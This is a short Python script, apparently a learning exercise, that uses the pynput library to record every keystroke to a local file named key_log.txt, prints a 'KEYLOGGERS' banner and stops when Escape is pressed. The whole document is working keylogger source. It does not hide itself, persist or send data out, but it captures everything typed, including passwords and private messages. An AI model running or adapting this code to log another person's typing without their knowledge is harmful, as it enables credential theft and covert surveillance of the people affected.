from pynput.keyboard import Key, Listener
import logging

print("---------- KEYLOGGERS ----------")
print(" ")


log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(message)s')

def on_press(key):
    #logging.info(str(key))
    logging.info('"{0}"'.format(key))
    if str(key) == "Key.esc":
        print('Saliendo...')
        exit()

with Listener(on_press=on_press) as listener:
    listener.join()

